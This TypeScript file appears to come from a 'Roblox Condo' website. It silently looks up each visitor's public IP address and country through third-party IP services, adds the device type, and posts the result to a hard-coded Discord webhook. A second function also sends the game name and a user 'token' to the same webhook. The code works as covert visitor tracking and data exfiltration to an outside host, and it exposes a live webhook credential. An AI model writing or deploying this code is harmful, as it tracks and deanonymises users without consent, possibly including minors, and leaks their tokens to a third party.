const WEBHOOK_URL = 'https://discord.com/api/webhooks/1512921363776536718/I2l7nZKFBkNNu6iU9qTdmztC8nQgfMA8M2-9jLrw-r6busVLb-b_4lnOC10mT14dPSSC';

function getDevice(): string {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/.test(ua)) return '📱 iOS';
  if (/Android/.test(ua)) return '📱 Android';
  if (/Windows/.test(ua)) return '💻 Windows PC';
  if (/Mac/.test(ua)) return '💻 Mac';
  if (/Linux/.test(ua)) return '🖥 Linux';
  return '❓ Unknown Device';
}

function getCountryFlag(code: string): string {
  if (!code || code.length !== 2) return '🌍';
  return String.fromCodePoint(
    ...code.toUpperCase().split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
  );
}

async function getGeo(): Promise<string> {
  const APIS = [
    async () => {
      const r = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(4000) });
      const d = await r.json();
      if (!d.success) throw new Error('fail');
      return `${getCountryFlag(d.country_code)} ${d.ip} — ${d.country}`;
    },
    async () => {
      const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
      const d = await r.json();
      if (!d.ip) throw new Error('fail');
      return `${getCountryFlag(d.country_code)} ${d.ip} — ${d.country_name}`;
    },
    async () => {
      const r = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
      const d = await r.json();
      return `🌍 ${d.ip}`;
    },
  ];

  for (const api of APIS) {
    try { return await api(); } catch { /* try next */ }
  }
  return '❓ Unknown';
}

function sendWebhook(body: object): void {
  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
    keepalive: true,
  }).catch(() => {});
}

export function logVisit(): void {
  const device = getDevice();
  const timestamp = new Date().toISOString();

  getGeo().then(ipStr => {
    sendWebhook({
      embeds: [{
        title: 'New Visitor',
        color: 14163750,
        fields: [
          { name: 'IP', value: ipStr, inline: false },
          { name: 'Device', value: device, inline: true },
          { name: 'Time', value: timestamp, inline: true },
        ],
        footer: { text: 'Roblox Condo — Visit Log' },
        timestamp,
      }],
    });
  });
}

export function logGameAccess(gameName: string, token: string): void {
  const device = getDevice();
  const timestamp = new Date().toISOString();

  getGeo().then(ipStr => {
    sendWebhook({
      embeds: [{
        title: 'Game Access',
        color: 3066993,
        fields: [
          { name: 'IP', value: ipStr, inline: false },
          { name: 'Device', value: device, inline: true },
          { name: 'Time', value: timestamp, inline: true },
          { name: 'Game', value: gameName, inline: true },
          { name: 'Token', value: `\`${token}\``, inline: false },
        ],
        footer: { text: 'Roblox Condo — Game Log' },
        timestamp,
      }],
    });
  });
}
